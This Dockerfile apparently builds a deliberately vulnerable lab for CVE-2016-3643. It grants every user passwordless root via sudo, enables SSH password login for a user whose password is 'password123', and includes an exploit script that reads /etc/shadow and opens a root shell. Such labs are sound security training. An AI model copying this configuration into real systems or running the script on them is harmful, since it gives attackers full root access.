FROM debian:bookworm-slim

# Install required packages
RUN apt-get update && apt-get install -y \
    openssh-server \
    sudo \
    passwd \
    && rm -rf /var/lib/apt/lists/*

# Setup SSH
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo 'lowpriv:password123' | chpasswd

# CVE-2016-3643: SolarWinds Virtualization Manager sudo misconfiguration
# The vulnerability is that ANY local user can run ANY command via sudo as root
# without a password. This simulates the exact misconfiguration found in the
# SolarWinds Virtualization Manager appliance.
RUN echo "ALL ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/solarwinds-vman && \
    chmod 440 /etc/sudoers.d/solarwinds-vman

# Create an exploit script that demonstrates the vulnerability
RUN cat <<'EXPLOIT_EOF' > /home/lowpriv/exploit.sh
#!/bin/bash
# CVE-2016-3643 - SolarWinds Virtualization Manager Local Privilege Escalation
# The sudo misconfiguration allows any local user to execute commands as root.
#
# Proof of Concept (from advisory):
#   sudo cat /etc/shadow
#
# For full root shell:
#   sudo /bin/bash
#   sudo su -

echo "[*] CVE-2016-3643 - SolarWinds Virtualization Manager sudo misconfiguration"
echo "[*] Any local user can execute commands as root via sudo"
echo ""
echo "[*] Demonstrating by reading /etc/shadow:"
sudo cat /etc/shadow
echo ""
echo "[*] Spawning root shell..."
sudo /bin/bash
EXPLOIT_EOF

RUN chown lowpriv:lowpriv /home/lowpriv/exploit.sh && \
    chmod +x /home/lowpriv/exploit.sh

# Verify the vulnerability is in place
RUN cat /etc/sudoers.d/solarwinds-vman && \
    echo "Sudo misconfiguration confirmed: ALL ALL=(ALL) NOPASSWD: ALL"

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]